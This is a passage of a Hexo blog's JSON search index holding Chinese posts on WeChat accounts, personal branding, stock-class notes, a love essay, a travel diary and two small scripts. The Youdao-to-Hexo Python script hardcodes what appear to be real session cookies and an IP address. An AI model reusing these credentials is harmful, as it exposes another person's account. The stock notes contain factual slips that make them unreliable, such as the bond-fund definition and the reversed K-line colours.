8.6.6","categories":[{"name":"城游","slug":"城游","permalink":"https://liuyi12138.github.io/categories/城游/"}],"tags":[{"name":"城游","slug":"城游","permalink":"https://liuyi12138.github.io/tags/城游/"},{"name":"英国游学","slug":"英国游学","permalink":"https://liuyi12138.github.io/tags/英国游学/"}]},{"title":"关于微信公众的一点思考","slug":"关于微信公众号的一点思考","date":"2019-05-09T23:55:16.000Z","updated":"2021-02-23T06:34:31.925Z","comments":true,"path":"2019/05/10/关于微信公众号的一点思考/","link":"","permalink":"https://liuyi12138.github.io/2019/05/10/关于微信公众号的一点思考/","excerpt":"今天早上发现微信公众号主页面更新了，总结了一下微信公众号最近的几次更改以及一些与之有关的问题","text":"今天早上发现微信公众号主页面更新了，总结了一下微信公众号最近的几次更改以及一些与之有关的问题 微信公众号平台的变动最近半年里微信公众号主要增设了看一看模块，用户对文章的点赞-&gt;好看-&gt;好看+想法-&gt;在看+想法 增设看一看：有写深度好文的能力的人逐渐转向了个人公众号，微信朋友圈里深度文章逐渐变少，而看一看模块补足了朋友圈在这一块的问题，成为了另一个朋友圈。 点赞-&gt;好看：看一看出现以后微信把点赞改为了好看，点了好看以后你推荐的文章将会出现在好友的看一看中 增加了推荐文章的成本 无形中被推荐文章的整体水平提升了 点好看时需要考虑到个人隐私的问题 好看-&gt;在看：一个小的修改，主要是因为对于一些悼文类型的文章，“xx觉得好看”这种评价显得不合适，于是改成了在看 增加想法: 进一步推进了看一看向朋友圈看齐 修改公众号主页面：公众号主页改为了将你所有公众号的更新放到了统一页面 主页略显拥挤，导致用户不得不退订一些不太喜欢的公众号 在一定程度上是对优质公众号的一种筛选 总的来说，这些修改对于用户流量来说并没有多大的影响，但对公众号的运营影响巨大，公众号无脑吸粉的时代已经过去了，公众号运营的重心从吸粉转移到了粉丝留存，微信逐渐倾向于留存具有优质内容的公众号，这与互联网从流量-&gt;用户的整体趋势是符合的 微信公众号的引流与运营 以前微信公众号的引流方式: 渠道引流：最主要的一种引流渠道，通过在各平台上写文章，写回答，互动等方式将各平台的用户引流到微信公众号 互推涨粉：微信公众号之间互相推荐涨粉 送礼涨粉：通常与微信公众号之间的互推同时使用，通过送书，抽奖等方式吸引用户关注公众号 社群营销：通过微信群+免费课程/活动的方式吸引用户加群进一步吸引用户关注公众号 现在公众号不得不思考的问题: 微信公众号主页的改版，用户取关公众号的概率增加 在引流的基础上运营与用户留存愈发重要 引用张哥的话”最好的运营方式就是持续真心地为用户解决问题” 微信公众号的变现 广告：广告是微信公众号变现的最大变现渠道，分为软广和硬广以及公众号推文下面的统一的广告 赞赏：赞赏变现的能力十分有限 电商变现：与广告类似，公众号只推荐一种产品，用户通过公众号购买，公众号运营者能获得提成 知识付费：一种新的玩法，例如现在的知识星球以及一些社群营销 英语流利说：100天英语打卡超过80天返还全部课程金额，有自己的微信群与app，均无广告，最可能的盈利方式应该是通过使用用户的前进行短期投资盈利","categories":[{"name":"商业思维","slug":"商业思维","permalink":"https://liuyi12138.github.io/categories/商业思维/"}],"tags":[{"name":"商业思维","slug":"商业思维","permalink":"https://liuyi12138.github.io/tags/商业思维/"},{"name":"微信公众号","slug":"微信公众号","permalink":"https://liuyi12138.github.io/tags/微信公众号/"}]},{"title":"stormzhang个人IP的打造","slug":"stormzhang个人IP的打造","date":"2019-04-20T13:03:16.000Z","updated":"2021-02-23T06:34:31.925Z","comments":true,"path":"2019/04/20/stormzhang个人IP的打造/","link":"","permalink":"https://liuyi12138.github.io/2019/04/20/stormzhang个人IP的打造/","excerpt":"stormzhang生财有术演讲后的分享 个人品牌就是最好的护城河","text":"stormzhang生财有术演讲后的分享 个人品牌就是最好的护城河 在增量经济时代 流量更重要 在存量经济时代 品牌更重要 怎样打造个人品牌 专业技能，擅长的领域 想好自己的核心用户 比自己落后的人 大学生-&gt;高中生-&gt;初中生 能为用户提供怎样的价值 分享经验 提供资源，人脉 讲述自己的故事 特点鲜明 跨界思维 个人IP的打造步骤内容 社交⽹络上，100⼈之中只有1个⼈具备⽣产内容的能⼒，10 个⼈会与你互动，剩余 89 ⼈都是浏览为主的内容消费者。 内容的形式与平台很多，文字和微信公众号是首选 营销 才华很重要，但让别人知道你的才华更重要 营销就是要不要脸 营销不能造假和包装 最好的营销是⾃⼰的真实故事，最好的个⼈品牌是真实做底。 可以借助平台来扩大影响力 运营 目的：提高用户粘性 生活的方方面面都要注意，全领域、多渠道触达⽤户，影响⽤户 最好的运营方式就是持续真心地为用户解决问题 个人品牌的商业变现 主要来源：广告，知识付费等 短期内很难变现 个⼈品牌不是短期速成的爆款，⽽是⻓久不断的积累与坚持，可能短期内看不到什么价值，但是却是⻓期复利效应最强的投资。 附上球友的思维导图总结 球友的思维导图","categories":[{"name":"商业思维","slug":"商业思维","permalink":"https://liuyi12138.github.io/categories/商业思维/"}],"tags":[{"name":"stormzhang","slug":"stormzhang","permalink":"https://liuyi12138.github.io/tags/stormzhang/"},{"name":"商业思维","slug":"商业思维","permalink":"https://liuyi12138.github.io/tags/商业思维/"}]},{"title":"shell上传图片到github图床","slug":"shell上传图片到github图床","date":"2019-04-16T15:54:16.000Z","updated":"2021-02-23T06:34:31.910Z","comments":true,"path":"2019/04/16/shell上传图片到github图床/","link":"","permalink":"https://liuyi12138.github.io/2019/04/16/shell上传图片到github图床/","excerpt":"在linux端写markdown需要图床而装picGo失败了，一直无法打开，所以自己写了一个小脚本先用着","text":"在linux端写markdown需要图床而装picGo失败了，一直无法打开，所以自己写了一个小脚本先用着 12345678910111213141516# !/bin/bashcd /media/liuyi/Linux/github/picturegit pullcd /home/liuyi/Desktopmv $1 /media/liuyi/Linux/github/picture/picturescd /media/liuyi/Linux/github/picturegit add .git commit -m \"picture\"git push origin masterecho -e \"\\n\"echo \"![](https://gitee.com/know_the_emperor/picture/raw/master/pictures/$1)\"echo -e \"\\n\"","categories":[{"name":"编程语言","slug":"编程语言","permalink":"https://liuyi12138.github.io/categories/编程语言/"}],"tags":[{"name":"轮子","slug":"轮子","permalink":"https://liuyi12138.github.io/tags/轮子/"},{"name":"shell","slug":"shell","permalink":"https://liuyi12138.github.io/tags/shell/"}]},{"title":"Python自动同步有道云笔记到Hexo","slug":"Python自动同步有道云笔记到Hexo","date":"2019-03-21T08:59:16.000Z","updated":"2021-02-23T06:34:31.910Z","comments":true,"path":"2019/03/21/Python自动同步有道云笔记到Hexo/","link":"","permalink":"https://liuyi12138.github.io/2019/03/21/Python自动同步有道云笔记到Hexo/","excerpt":"对一个大佬的代码进行了删改，不过貌似大佬并没有理我的gayhub合并请求","text":"对一个大佬的代码进行了删改，不过貌似大佬并没有理我的gayhub合并请求 2019.4.15 今天发现我的分支被人fork了！有点开心，感觉自己为开源社区做出来一丢丢贡献这样子~~~ 2019.4.16 发现cookie过期了，感觉需要写一下登录了 2019.4.16 查了一下有道云的官方api好像已经没有人维护了，所以只能使用现有的api，因此还是要从cookie的值来解决问题。起初想到的是直接从浏览器获取cookie，但代码在云端运行就拿不到cookie了，又想到模拟登陆后获取cookie，但一方面我的账号是qq登录，另一方面有道云对密码做了加密所以没法post数据过去，暂时没想到有什么好的方法可以解决。 2019.4.18 尝试构建post表单来qq登录获取cookie，但有道云的页面显然是做过加密的，获取并不容易。现在有两个思路: 1.服务端使用一个文件读取cookie，并且构建一个udp通信，本地读取cookie后同步到服务端文件。但依旧绕不开获取cookie，本地可以尝试在Chrome的cookie文件获取cookie 2.申请有道云api的秘钥，使用其api来进行文件获取。但不知道能不能拿到秘钥以及工程量比较大 总而言之就是还没有一个很好的方法来解决问题，继续尝试中。。。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230#coding=utf-8import sysimport requestsimport timeimport reimport osimport shutilimport hashlibimport commandsimport Queueimport threadingreload(sys)sys.setdefaultencoding('utf8')# Hexo 文件夹HEXO_DIR = '/blog/source/_posts'# 登录有道云笔记后存储在 Cookie 里的值YNOTE_PERS = 'v2|cqq||YNOTE||web||7776000000||1553092933721||115.156.142.129||qq7265F91BB452AB2B63C3B07B55887AEB||eShHUMhLTZ0l5OMp4646z0JL6LPynMTy0QZOLkGnMe40JFOLqSh4JyROG0Mw4h4zA0zYOMgZ6Lg4RgFPLpBP46uR'YNOTE_SESS = 'v2|3H29AJgmLRgykfkERMOY06FhHUGRMqL0lGnMQuPLwFRYm6MTF0LJuRzfhLQ4P4zW0z50MpKOfzY0q4OfUGO4pz0pBkLU5RHJLR'YNOTE_LOGIN = '5||1553093006110'CSTK = 'qd9PNsay'HEADERS = &#123; 'Accept-Encoding': 'gzip, deflate, br', 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.115 Safari/537.36', 'Cookie': 'YNOTE_PERS=&#123;YNOTE_PERS&#125;; YNOTE_SESS=&#123;YNOTE_SESS&#125;; YNOTE_LOGIN=&#123;YNOTE_LOGIN&#125;; YNOTE_CSTK=&#123;YNOTE_CSTK&#125;'. format( YNOTE_PERS=YNOTE_PERS, YNOTE_SESS=YNOTE_SESS, YNOTE_LOGIN=YNOTE_LOGIN, YNOTE_CSTK=CSTK), 'Accept': 'application/json, text/plain, */*', 'Host': 'note.youdao.com', 'Origin': 'https://note.youdao.com', 'Referer': 'https://note.youdao.com/web/', 'Content-Type': 'application/x-www-form-urlencoded;charset=UTF-8'&#125;# 获取某笔记本下所有的笔记本def getBooks(path): data = &#123;'path': path, 'dirOnly': True, 'f': True, 'cstk': CSTK&#125; url = 'https://note.youdao.com/yws/api/personal/file?method=listEntireByParentPath&amp;cstk=&#123;CSTK&#125;&amp;keyfrom=web'.format( CSTK=CSTK) res = requests.post(url, data=data, headers=HEADERS) if res.status_code == 200: resJson = res.json() books = [] for i in resJson: # _私密, _开头的笔记本认为是私密笔记, 跳过 if i['fileEntry']['name'][0] != '_': books.append(&#123; 'name': i['fileEntry']['name'], 'id': i['fileEntry']['id'] &#125;) print(len(books)) return books else: exit('getBooks')# 获取所有的笔记本def getAllBooks(): ids = Queue.Queue() ids.put('/') books = [] while not ids.empty(): print(ids.queue) tempId = ids.get() tempBooks = getBooks(tempId) for book in tempBooks: if tempId == '/': aId = tempId + book['id'] else: aId = tempId + '/' + book['id'] ids.put(aId) books.append(&#123; 'name': book['name'], 'id': book['id'] &#125;) print ('allbooks') print(len(books)) return books# 获取笔记本下的笔记def getAllNotes(book): url = 'https://note.youdao.com/yws/api/personal/file/&#123;id&#125;?all=true&amp;cstk=&#123;CSTK&#125;&amp;f=true&amp;isReverse=false&amp;keyfrom=web&amp;len=30&amp;method=listPageByParentId&amp;sort=1'.format( id=book['id'], CSTK=CSTK) res = requests.get(url, headers=HEADERS) if res.status_code == 200: resJson = res.json() notes = [] for i in resJson['entries']: # 选出后缀名为md的文件 if i['fileEntry']['name'][-2:] == 'md' and i['fileEntry']['name'][0] != '_': notes.append(&#123; 'name': i['fileEntry']['name'], 'id': i['fileEntry']['id'], 'createTime': i['fileEntry']['createTimeForSort'], 'modifyTime': i['fileEntry']['modifyTimeForSort'], 'tag': book['name'] &#125;) return notes else: exit('getAllNotes')# 根据笔记信息获取笔记内容def getNoteDetail(note): url = 'https://note.youdao.com/yws/api/personal/file/&#123;id&#125;?method=download&amp;read=true&amp;cstk=&#123;CSTK&#125;'.format( id=note['id'], CSTK=CSTK) res = requests.get(url, headers=HEADERS) if res.status_code: resCon = res.content time = '' if note['modifyTime']: # 优先选用修改时间 time = parseTS(note['modifyTime']) else: time = parseTS(note['createTime']) detail = &#123; 'name': filterMark(note['name']), 'time': time, 'content': resCon, 'tag': note['tag'] &#125; return detail else: exit('getNoteDetail')# 写入文档def writeMd(detail): print('写入: &#123;name&#125;'.format(name=detail['name'])) with open('_posts/' + detail['name'], 'w') as f: # f.write('---\\n') # f.write('title: &#123;title&#125;\\n'.format(title=detail['name'][:-3])) # f.write('date: &#123;data&#125;\\n'.format(data=detail['time'])) # f.write('tags: &#123;tag&#125;\\n'.format(tag=detail['tag'])) # f.write('---\\n\\n\\n') f.write(detail['content']) f.write('\\n')# 将 _posts 目录替换到 hexo/source/_posts, 并部署提交# 注意: 这将删除原有 _posts 目录, 请事先备份def deployHexo(): shutil.rmtree(HEXO_DIR) shutil.copytree('_posts', HEXO_DIR) print('开始部署 hexo ...') dep = commands.getstatusoutput( 'cd &#123;hexo_dir&#125; &amp;&amp; hexo clean &amp;&amp; hexo g &amp;&amp; hexo d'.format( hexo_dir=HEXO_DIR)) if dep[0] == 0: print('部署成功') else: print('部署失败') print(dep)# 将10位时间戳转为 2017-06-29 10:00:00 的格式def parseTS(ts): timeArr = time.localtime(ts) return time.strftime(\"%Y-%m-%d %H:%M:%S\", timeArr)# 过滤特殊字符, 移除原有后缀后重新添加.mddef filterMark(s): # s = s.decode(\"utf8\") res = re.sub( \"[\\s+\\.\\!\\/_,$%^*(+\\\"\\']+|[+——！，。？、~@#￥%……&amp;*（）()]+\".decode(\"utf8\"), \"\".decode(\"utf8\"), s) res = res.replace(' ', '') return res[:-2] + '.md'# MD5 加密def md5(str): md5 = hashlib.md5() md5.update(str) return md5.hexdigest()# 退出程序def exit(why): print('&#123;why&#125; 出错了'.format(why=why)) os._exit(0)# 入口def start(): if os.path.exists('_posts'): shutil.rmtree(r'_posts') os.mkdir(r'_posts') books = getAllBooks() for i in books: notes = getAllNotes(i) print(len(notes)) for j in notes: detail = getNoteDetail(j) writeMd(detail) deployHexo() t = threading.Timer(432000, start) t.start() if __name__ == '__main__': start() # time.sleep(24 * 60 * 60) 使用nohup python youdaoToHexo.py &amp;运行代码 (守护进程) nohup和&amp;后台运行，进程查看及终止 根目录下的文件以及以”_”开头的文件不会被copy ps -aux|grep youdaoToHexo.py 查看运行状态","categories":[{"name":"编程语言","slug":"编程语言","permalink":"https://liuyi12138.github.io/categories/编程语言/"}],"tags":[{"name":"轮子","slug":"轮子","permalink":"https://liuyi12138.github.io/tags/轮子/"},{"name":"Python","slug":"Python","permalink":"https://liuyi12138.github.io/tags/Python/"}]},{"title":"证券投资","slug":"证券投资","date":"2019-03-13T12:03:16.000Z","updated":"2021-02-23T06:34:31.941Z","comments":true,"path":"2019/03/13/证券投资/","link":"","permalink":"https://liuyi12138.github.io/2019/03/13/证券投资/","excerpt":"大二下证券投资公选笔记","text":"大二下证券投资公选笔记 3.13 Eps(每股收益/每股利润) = 净利润/股数 股票的特点: 不可偿还性 流通性 收益性 波动性 上海交易系统(主板+科创板(正在筹划))，深圳交易系统(中小板+创业板) CPI(居民消费价格指数) 反映居民家庭一般所购买的消费品和服务项目价格水平变动情况的宏观经济指标,其变动率在一定程度上反映了通货膨胀或紧缩的程度。一般来讲，物价全面地、变化对比、持续地上涨就被认为发生了通货膨胀。 交易单位 1手 = 100股 (成交==换手) K线 最高 收盘 开盘 最低 开盘价 &gt; 收盘价 红色 阳线 开盘价 &lt; 收盘价 绿色 阴时线 股票交易 送股： 送股是上市公司将本年的利润留在公司里，发放股票作为红利，送股后，公司的资产、负债、股东权益的总额结构并没有发生改变，但总股本增大了，同时每股净资产降低了，股价也相应降低。 转股：转增股本是指公司将资本公积金转化为股本，转增股本并没有改变股东的权益，但却增加了股本的规模，结果与送股相似。 参考资料: 派股、送股、配股、转股的概念 股权登记日：股权登记日，上市公司在送股、派息或配股或召开股东大会的时候，需要定出某一天，界定哪些主体可以参加分红、参与配股或具有投票权利，定出的这一天就是股权登记日。也就是说，在股权登记日这一天收盘时仍持有或买进该公司的股票的投资者是可以享有此次分红或参与此次配股或参加此次股东大会的股东，这部分股东名册由证券登记公司统计在案，届时将所应送的红股、现金红利或者配股权划到这部分股东的帐上。 除权除息日: 除权除息日是指上市公司发放股息红利的日子，股权登记日下一个交易日即是除权除息日。在股票的除权除息日，证券交易所都要计算出股票的除权除息价，以作为股民在除权除息日开盘的参考。进行股权登记后，股票将要除权除息，也就是将股票中含有的分红权利予以解除。除权除息都在股权登记日的收盘后进行。除权之后再购买股票的股东将不再享有分红派息的权利。 复权:由于在股权登记日股本改变而每股净资产降低，造成股值曲线的不连续，前复权是把股权登记日前的股值按现在的股本计算出股值，后复权则相反，是把股权登记日后的股值按之前的股本计算出股值 3.20基金分类： 股票型：所有的钱全部买股票 债券型：所有的钱全部买股票 混合型：股票债券等各买一部分 指数型：以特定指数（如沪深300指数、标普500指数、纳斯达克100指数、日经225指数等）为标的指数，并以该指数的成份股为投资对象，通过购买该指数的全部或部分成份股构建投资组合 机构投资者占市场的大部分 基金 证券公司 保险公司 中央汇金，中央证金，梧桐树(外汇局) 社保基金 养老基金 信托公司 外资 私募基金(由证券，基金，信托等发起的资金计划) 社保基金大额买入可能是国家注资 证券市场 融资 定价: 每个公司的股票价格趋于稳定 面值： 表明每一张股票所包含的资本数额 可用来表明股票的认购者在股份公司的投资中所占的比例，当股票进入流通市场后 股票的面值就与股票的价格没有什么关系了，不论股票市场价格发生什么变化，其面值都是不变的 发行价：发行公司将股票出售给投资人时的价格 每股净资产：每股净资产 = 股东权益(公司本身拥有的财产) / 总股数 理论价值：未来的利润之和 设每年利润为En,通货膨胀率为x,理论价值为Σ(En/(1+x)^x) 退市： *ST：退市风险警示 连续亏损两年警告，三年暂停交易，四年退市 净资产&lt;0 一年停盘，两年退市 违法 / 信息披露违规 未来的股价与公司的价值，增长率有关。增速越快，价格越高，估值越高。 3.27证券市场 定价与估值 市场的定价法则：定价p=n·Eps （n由市场决定) 市盈率PE 市盈率PE=p(股价)/Eps(每股盈余) MAX代表X天均线，可用均值来计算市盈率 多家公司平均市盈率nPE = Σ市场价值/Σ净利润 整个市场的PE 美国(15左右) 每个行业的市盈率不同 增长高且快(20 甚至30-40): 电子产品，软件，通讯，新材料，生物制药,AI，高端制造，娱乐传媒 稀有资源 15-20 服务行业(食品，供水供电，旅游，商业) 15-20 未来会保证一定的增速 传统行业(钢铁，石油，化工，金融) 15以下 市盈率高好还是低好 4.3公司估值 静态估值：用已知的EPS估值 动态估值：根据每股收益预测来动态估值（规避风险） 考虑公司报表中EPS的真假 利润总和75%(交税25%)=净利润 (高新产业15%税务) 注意增长过快的数据(例如投资收益) 无法确定未来是EPS则预测公司未来的发展 寻找迅速增长的企业 利润来源：成本下降，售价上升，销量上升，有市场需求 市场格局： 完全竞争：零售，网店 完全垄断：国家限制涨价 寡头垄断：电信，移动，联通 从企业所在行业看 市场需求增长快 持续增长，市场容量大 门槛高，寡头垄断 从企业在行业中的占位看 龙头企业，竞争力强 利润率高 4.10行业分析 新技术，产品，商业模式 政策 经济三驾马车：投资，消费，进出口 投资方向：企业，房地产，基建 科创板行业：信息技术，高端装备，新材料，新能源，节能环保，生物医药 国企改革：混合所有制，资金注入(资产证券)，股权激励 消费习惯 大事件 911 —＞ 安检设备 战乱 —＞ 先不买，等稳定后买黄金 经济周期 股权激励 企业分析 技术产品，核心竞争力，持续性分析 技术领先——国际水平 品牌 资源垄断(稀有金属，许可证) 市场占有率 低成本 财务分析 营业毛利率 = 毛利润/收入 营业净利润率 = 营业费用/营业收入 营业利润率 = 营业额 对一支股票的分析分为行业分析，企业分析，估值，风险评估四个方面","categories":[],"tags":[{"name":"证券投资","slug":"证券投资","permalink":"https://liuyi12138.github.io/tags/证券投资/"}]},{"title":"春天的第十八个瞬间","slug":"春天的十八个瞬间","date":"2019-01-27T13:58:11.000Z","updated":"2021-02-23T06:34:31.925Z","comments":true,"path":"2019/01/27/春天的十八个瞬间/","link":"","permalink":"https://liuyi12138.github.io/2019/01/27/春天的十八个瞬间/","excerpt":"走在回学校路上，许许多多的话语在心中翻涌，待到下笔之时，思绪却又是无法凝聚。宋胖子的歌声里夹杂着开水沸腾的声音，辣条的香气里都是一个个说不尽故事，这标题就这么兀自遛了出来，从江南老贼写不尽的书里。","text":"走在回学校路上，许许多多的话语在心中翻涌，待到下笔之时，思绪却又是无法凝聚。宋胖子的歌声里夹杂着开水沸腾的声音，辣条的香气里都是一个个说不尽故事，这标题就这么兀自遛了出来，从江南老贼写不尽的书里。 与你相伴走过了夏秋冬三季，似是无春，却是你我心中那春天的故事，最让人心心恋恋。那一拈指间的一次回首，那一颦一笑，那一瞬瞬想不起又忘不掉的模糊记忆，最是醉人。 第一次识你，是在18级大群看到了你的照片，霎时间只是默叹，”世上有如此佳人，只怨年少读书甚少，做不得锦衣才子” 第一次见你，是9月迎新，你踏着小碎步而来，留下几包零食，又踏着小碎步哒哒哒离去。 第一次说上话，是赠书与你，当时只想着结下善缘，雨天想送你，你说同学在楼下呢。 第一次了解你，是赛事部面试，我假装严肃，你咯吱咯吱笑个不停。 第一次约你出来，喝奶茶讲故事，只觉得这女子好生潇洒，拿的起放的下，比我要强。 第一次与你打电话，在郑州，有一句没一句地聊着，从不知道居然打电话能打这么久。 就这样一瞬瞬地恍过，好像就与你在一起了。一回首，浮生若梦，好像一点一滴恰到好处，恰好够我爱上你。 这之后又有多少个瞬间呢，有许多许多的，有你嘿嘿一笑，也有你暗自落泪，有你气鼓鼓地在前走，也有你委屈地踱着步子。只要我闭上眼，你就在那里跑来跑去，又哭又笑。 与你一起度过了第100天，第101天，第102天，接着就该是见不到你的第一天了，不知你是不是也会如此想我呢？ 很巧也很不巧，让我遇见了你。但既然遇见，便要知珍惜，我向来以为，一个人的时候要潇潇洒洒，两个人就该平平淡淡，但也愿为你说上一句，世间安得双全法，宁负我心不负卿。","categories":[{"name":"文学","slug":"文学","permalink":"https://liuyi12138.github.io/categories/文学/"}],"tags":[{"name":"心声","slug":"心声","permalink":"https://liuyi12138.github.io/tags/心声/"}]},{"title":"C++刷Leetcode导航","slug":"C++LeetCode刷题笔记","date":"2019-01-24T13:46:04.000Z","updated":"2021-02-23T06:34:31.894Z","comments":true,"path":"2019/01/24/C++LeetCode刷题笔记/","link":"","permalink":"https://liuyi12138.github.io/2019/01/24/C++LeetCode刷题笔记/","excerpt":"最近在用C++刷Leetcode，就找了一篇刷题指南按顺序刷了下去，整理了一些笔记 参考刷题指南","text":"最近在用C++刷Leetcode，就找了一篇刷题指南按顺序刷了下去，整理了一些笔记 参考刷题指南 刷题顺序： Leet Code OJ 1. Two Sum [Difficulty: Easy] Leet Code OJ 8. String to Integer (atoi) [Difficulty: Easy] Leet Code OJ 15. 3Sum [Difficulty: Medium] Leet Code OJ 20. Valid Parentheses [Difficulty: Easy] Leet Code OJ 21. Merge Two Sorted Lists [Difficulty: Easy] Leet Code OJ 28. Implement strStr() [Difficulty: Easy] Leet Code OJ 56. Merge Intervals [Difficulty: Medium] Leet Code OJ 57. Insert Interval [Difficulty: Hard] Leet Code OJ 65. Valid Number [Difficulty: Hard] Leet Code OJ 70. Climbing Stairs [Difficulty: Easy] Leet Code OJ 73. Set Matrix Zeroes [Difficulty: Medium] Leet Code OJ 88. Merge Sorted Array [Difficulty: Easy] Leet Code OJ 98. Validate Binary Search Tree [Difficulty: Medium] Leet Code OJ 125. Valid Palindrome [Difficulty: Easy] Leet Code OJ 127. Word Ladder [Difficulty: Medium] `","categories":[{"name":"编程语言","slug":"编程语言","permalink":"https://liuyi12138.github.io/categories/编程语言/"}],"tags":[{"name":"C++","slug":"C","permalink":"https://liuyi12138.github.io/tags/C/"},{"name":"Leetcode","slug":"Leetcode","permalink":"https://liuyi12138.github.io/tags/Leetcode/"}]},{"title":"郑州——三日谈","slug":"城游－郑州","date":"2018-10-06T04:19:36.000Z","updated":"2021-02-23T06:34:31.925Z","comments":true,"path":"2018/10/06/城游－郑州/","link":"","permalink":"https://liuyi12138.github.io/2018/10/06/城游－郑州/","excerpt":"2018年国庆，又是一场说走就走的旅行，卸载了QQ和TIM，一个人，一背包，没有做任何准备就踏上去郑州的火车，试图去寻找自己想要的生活。在旅行途中想了很多很多，解开了一个又一个心结，并在旅途中写下了这篇游记。","text":"2018年国庆，又是一场说走就走的旅行，卸载了QQ和TIM，一个人，一背包，没有做任何准备就踏上去郑州的火车，试图去寻找自己想要的生活。在旅行途中想了很多很多，解开了一个又一个心结，并在旅途中写下了这篇游记。 10.3旅途中 10.3日早9:06，终于坐上了从武昌开往郑州的火车，虽然是硬座，但人生中第一次独自出游已经够人兴奋好一阵子了。在火车上，四个年轻人侃侃而谈，一个去武汉看同学的黑龙江男孩，正在回学校的路上;一个超可爱的大三学姐，谈到家和吃的眼里就放光;一个21岁的”老男人”，漂泊在外四海为家;一个独自去郑州的傻小子，想寻求内心的宁静。突然一下子就有了”江湖”的感觉:我们在这里相遇，又在这里告别，我甚至不知道你们的名字，但我相信，无论在哪，若是有下一次遇见，我们会互道一声 好久不见。 大三小姐姐 初识郑州 下了火车，便坐上地铁往住所奔去，郑州的地铁给我留下了很好的第一印象。地铁站空阔而干净，人们买票上车都有条不紊，甚至能做到先下后上。地铁站里很少能看见在奔跑的人，或许是郑州人本身就是慢性子，或许是他们有着很好的时间规划，无论是哪一种，都让人能感受得到这个城市的氛围十分宜居。 郑州火车站 我订的酒店在二七广场，属于回民管制区，出地铁后过一个天桥便能看到。二七广场上有一座双子塔，每小时会报一次时，从酒店出门恰好听见了18点的钟声悠扬，天桥上许多人在驻足欣赏，街上的红绿灯设计的很不科学，但人与车却异常和谐，顺应这这座城市的节奏在流动，不喧嚣，不吵闹。 二七广场 郑州大学 晚上18点，从二七广场出发，去往郑州大学，本意是去郑州大学老校区，感受一下文化底蕴。可惜在地铁站买错了票，选择了郑大新校区，也错过了日落。夏日的白天显得尤为短暂，进地铁口时太阳还挂得老高，短短二十多分钟光景，等到达郑大新校区，夜幕已经完全拉开了，随着同站下车的小姐姐们走出了好远，才由一小门进入郑大。 对于大学，我一直有一股执念，因为华科虽好，但其中的校园氛围并不能使我满意。横平竖直的街道，规规矩矩的建筑，行色匆匆的华科男，给人一种压抑的气息。前前后后也走遍了武汉各大高校，地大的人文氛围尤令人满意，一入夜，操场上都是三五成群，熙熙攘攘的学生，有人在歌唱，有人在欢笑，有人在运动，有人在驻足欣赏。但好似也差了点作为学校应有的静谧。 初入郑大，一股我科的建筑风格映入眼帘，四四方方的道路两旁被繁茂的枝叶占领，可能是假期的缘故，一路上人着实不多，只有三三两两的自行车驶过，虽然建筑风格与华科惊人的相似，但并没有让人感到压迫，这倒让人觉得很是惊奇，骑上一辆哈罗，在来来往往跑步的同学之间穿梭，才逐渐发现其中的缘由——在校园里骑了这么久，竟没有一辆汽车。 此时才幡然醒悟，哦，原来我科的压抑氛围居然是因为那宽广的道路，因为那昼夜不歇的红绿灯，因为那一条条斑马线，因为来来往往，川流不息的汽车。仿佛是这样，高速行驶的汽车给华科带来了城市生活的节奏，也带来了一栋栋高楼下疲惫的灵魂。在郑大, 我也不曾见到一辆电动车，今晚在路上，听到一个女生在打电话，不知在与谁诉说着拥有自行车的欣喜。这是一所不追寻速度的大学，图书馆的灯光照亮了整个校园，也将静谧照进了我的心里。 郑州大学 在郑大的校园继续游荡， 骑着骑着，竟看到一泓湖水，遂停车前往，又听到水中的天鹅啼鸣，水边的石椅上早已坐满了人，孩子们的欢笑声在天鹅的身旁萦绕着。湖水上有三座彩虹桥，晚上灯光闪烁。缓步移过桥去，一片生活区与学生公寓突然出现，被右手边传来阵阵球声吸引，又挪步去了郑大体育馆。篮球场没有灯光，但人却也不少，不打场，只三三两两地在练球。郑大就是这样一个神奇的地方，一泓湖水，三座小桥，一群天鹅，隔开的是喧嚣与静谧，连接的是深厚的学术底蕴与青春的蓬勃朝气。而在华科的校园里，学术与生活是紧紧结合在一起的，作为一个华中大人，我不由得为此感到痛心，大家都是十几二十岁的孩子，又有多少人能在这两者之间找到平衡，找到真正的自我呢?我觉得我做不到，也不相信有很多人能做得比我好。 愉快地玩耍了一个多小时后，买了郑大的明信片便踏上了归途，虽然阴差阳错地去错了地方，但却有着意外的收获，在我后两天的行程中也一定会有郑大老校区的身影。 10.4方中山胡辣汤 郑州是一座没有夜晚的城市，大家日出而作，日落而息。清晨的郑州尤为的安静，早上6点出门，伴着二七塔上传来的阵阵钟声，一个人在马路上横穿，大多店铺都尚未开门，整个二七广场沉浸在一股安静祥宁的氛围之中。 穿过大马路，闯过红绿灯，翻过围栏，来到了地铁站。地铁站的人也并不多，令人意外的是，清晨第一班列车竟在6:19才发车，等到了紫荆路，太阳还未出，街上的车逐渐多了起来。 出了地铁站，走上一小会，就找到了方中山胡辣汤总店 方中山胡辣汤总店 由于时间尚早，并没有很多人排队，几分钟就买好了早餐，一碗胡辣汤加很多水煎包，胡辣汤八元一碗，水煎包一元两个，不得不说非常实惠了。前一天晚上，晓雪告诉我胡辣汤很清淡，就跟咸豆腐脑一样，今日一尝，感悟颇深:世上为什么会有如此难喝之汤!浓稠的汤水上飘满了胡椒粉,着实是吃不惯，店里的其他几位外地游客也都只是稍稍喝了几口，但旁边的大叔喝得可香了!虽然吃的并不算好，但能在这种店中慢吞吞地吃上一顿早餐本身也是一种享受吧。 胡辣汤与水煎包 紫荆公园 吃过早餐并不想回酒店，就去了紫荆公园，再一次感受到了郑州闲适的生活氛围，公园早已被晨练的大爷大妈所占领，一切都不急不缓，井井有条。 紫荆公园 出了公园便骑上一辆哈罗沿着马路乱逛，郑州的一天仿佛是从八点以后开始的，街道上的大部门店铺都没有开门，车流量也不大，太阳正将它的触角逐渐伸向这座城市的每一个角落。 阿春家全蟹小笼包 午觉醒来，便直奔下一个网红美食店——阿春家全蟹小笼包，真的是低调而傲娇的一家店。店铺很小，只有四张桌子，最多能容纳下13人，而店里有自己的规定:没有座位的人不能点餐! 即使店外大排长龙 